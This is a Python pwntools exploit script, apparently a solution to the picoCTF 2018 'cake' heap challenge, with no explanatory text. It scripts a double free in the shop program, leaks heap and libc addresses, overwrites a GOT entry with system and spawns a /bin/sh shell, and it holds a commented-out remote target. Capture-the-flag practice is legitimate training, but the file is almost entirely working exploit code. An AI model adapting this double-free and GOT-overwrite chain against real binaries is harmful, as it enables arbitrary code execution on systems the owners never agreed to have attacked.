#!/usr/bin/python
from pwn import *
import re
DEBUG=0
if DEBUG:
	context(log_level='debug',arch='amd64')
else:
	context(arch='amd64')
p=process('./cake')
# p=process('./cake')
libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
# p=remote("2018shell3.picoctf.com",54086)
def make(name,price):
	p.sendlineafter("* [C]lose the shop.\n> ",'M')
	p.sendlineafter("Name> ",name[:7].ljust(7,'\x00'))
	p.sendlineafter("Price> ",str(price))
def wait():
	p.sendlineafter("* [C]lose the shop.\n> ",'W')
def serve(index):
	p.sendlineafter("* [C]lose the shop.\n> ",'S')
	p.sendlineafter("This customer looks really hungry. Which cake would you like to give them?\n> ",str(index))
def inspect(index):
	p.sendlineafter("* [C]lose the shop.\n> ",'I')
	p.sendlineafter("Which one?\n> ",str(index))
	name=p.recvuntil(' is being').strip(' is being')
	p.recvuntil('for $')
	price=p.recvline().strip('\n')
	debug("name: %s price: %s"%(name,price))
	return name,price
def close():
	p.sendlineafter("* [C]lose the shop.\n> ",'C')
def attach(addr=0):
	if DEBUG:
		if addr!=0:
			gdb.attach(p,'b *0x%x'%addr)
		else:
			gdb.attach(p)

make('cpeggc0',100)#0
make('cpeggc1',101)#1
make('cpeggc2',102)#2
serve(0)
serve(1)
serve(0)
(name,price)=inspect(0)

heapbase=int(price)-0x1030
info("heapbase: 0x%x"%heapbase)

make('cpeggc3',0x6030E0)#3
make('cpeggc4',104)#4
make(p64(0x21),105)#5

for i in range(108):
	wait()
make(p64(0x603088),0x6030e0)#6
(name,price)=inspect(1)
attach()
libcbase=u64(name.ljust(8,'\x00'))-libc.symbols['rand']
info("libcbase: 0x%x"%libcbase)


serve(3)
serve(4)
serve(3)
serve(4)
make('cpeggc7',0x6030e0)#7
make('cpeggc8',0x6030e0)#8
make('cpeggc9',0x6030e0)#9
for i in range(3):
	wait()
make(p64(0),u64('/bin/sh\x00'))#10
make(p64(0x603018),libcbase+libc.symbols['system'])
serve(6)

p.interactive()
